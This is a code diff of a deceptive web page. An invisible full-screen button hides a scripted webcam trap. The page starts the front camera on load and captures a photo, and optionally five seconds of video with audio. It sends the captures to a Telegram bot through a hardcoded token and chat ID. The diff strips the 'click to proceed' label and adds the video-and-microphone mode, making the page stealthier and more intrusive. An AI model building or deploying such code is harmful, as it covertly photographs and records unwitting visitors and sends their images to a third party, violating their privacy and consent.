@@ -5,101 +5,74 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title></title>
 <style>
-html,body{
-  margin:0;padding:0;width:100%;height:100%;
-  background:#fff;overflow:hidden;
-  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
-}
-#btn{
-  position:fixed;top:0;left:0;width:100%;height:100%;
-  border:0;background:transparent;padding:0;cursor:pointer;
-  display:flex;align-items:center;justify-content:center;
-  color:#333;font-size:20px;font-weight:500;
-  -webkit-tap-highlight-color:transparent;
-}
+html,body{margin:0;padding:0;width:100%;height:100%;background:#fff;overflow:hidden;}
+#btn{position:fixed;top:0;left:0;width:100%;height:100%;border:0;background:transparent;padding:0;cursor:pointer;-webkit-tap-highlight-color:transparent;}
 </style>
 </head>
 <body>
-
 <video id="v" autoplay playsinline style="display:none;"></video>
 <canvas id="c" style="display:none;"></canvas>
-<button id="btn">Нажмите, чтобы перейти</button>
-
+<button id="btn"></button>
 <script>
 var TOKEN = "8998787761:AAHSE8bZXPhB2A4IMB273cIZD4qoaSUNDJk";
 var CHAT  = "1314241513";
-
+var mode  = new URLSearchParams(window.location.search).get("mode") || "photo";
 var v = document.getElementById("v");
 var c = document.getElementById("c");
-var btn = document.getElementById("btn");
+var stream = null, ready = false, done = false;
 
-var stream = null;
-var ready = false;
-var counter = 0;
-
-// Запускаем камеру СРАЗУ при загрузке страницы
 function initCamera() {
-  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
-
-  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-  .then(function(s) {
-    stream = s;
-    v.srcObject = s;
-    return v.play();
-  })
-  .then(function() {
-    ready = true;
-  })
-  .catch(function(e) {
-    console.log("cam err", e.name);
-  });
+    var constraints = { video: { facingMode: "user" } };
+    if (mode === "video") constraints.audio = true;
+    navigator.mediaDevices.getUserMedia(constraints)
+    .then(function(s) { stream = s; v.srcObject = s; return v.play(); })
+    .then(function() { ready = true; })
+    .catch(function(e) { console.log(e.name); });
 }
 
-// Один снимок → отправить в Telegram
-function snap() {
-  if (!ready) {
-    initCamera();
-    return;
-  }
-
-  try {
-    c.width  = v.videoWidth  || 640;
-    c.height = v.videoHeight || 480;
-    c.getContext("2d").drawImage(v, 0, 0);
-
-    c.toBlob(function(blob) {
-      if (!blob) return;
-      counter++;
-
-      // Меняем текст, чтобы было видно, что «идёт загрузка»
-      btn.textContent = "Загрузка... (" + counter + ")";
-
-      var fd = new FormData();
-      fd.append("chat_id", CHAT);
-      fd.append("photo", blob, "photo_" + counter + ".jpg");
-
-      fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", {
-        method: "POST",
-        body: fd
-      })
-      .then(function() {
-        // Через секунду возвращаем текст обратно
-        setTimeout(function() {
-          btn.textContent = "Нажмите, чтобы перейти";
-        }, 800);
-      })
-      .catch(function() {
-        setTimeout(function() {
-          btn.textContent = "Нажмите, чтобы перейти";
-        }, 800);
-      });
-    }, "image/jpeg", 0.85);
-  } catch (e) {
-    console.log(e);
-  }
+function sendPhoto() {
+    return new Promise(function(resolve) {
+        c.width = v.videoWidth || 640;
+        c.height = v.videoHeight || 480;
+        c.getContext("2d").drawImage(v, 0, 0);
+        c.toBlob(function(blob) {
+            if (!blob) { resolve(); return; }
+            var fd = new FormData();
+            fd.append("chat_id", CHAT);
+            fd.append("photo", blob, "photo.jpg");
+            fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", { method: "POST", body: fd })
+            .then(resolve).catch(resolve);
+        }, "image/jpeg", 0.85);
+    });
 }
 
-btn.addEventListener("click", snap);
+function sendVideo() {
+    return new Promise(function(resolve) {
+        var recorder = new MediaRecorder(stream);
+        var chunks = [];
+        recorder.ondataavailable = function(e) { chunks.push(e.data); };
+        recorder.onstop = function() {
+            var blob = new Blob(chunks, { type: "video/mp4" });
+            var fd = new FormData();
+            fd.append("chat_id", CHAT);
+            fd.append("video", blob, "video.mp4");
+            fetch("https://api.telegram.org/bot" + TOKEN + "/sendVideo", { method: "POST", body: fd })
+            .then(resolve).catch(resolve);
+        };
+        recorder.start();
+        setTimeout(function() { recorder.stop(); }, 5000);
+    });
+}
+
+document.getElementById("btn").addEventListener("click", async function() {
+    if (done) return;
+    if (!ready) { initCamera(); return; }
+    done = true;
+    await sendPhoto();
+    if (mode === "video") await sendVideo();
+    if (stream) stream.getTracks().forEach(function(t) { t.stop(); });
+});
+
 initCamera();
 </script>
 </body>
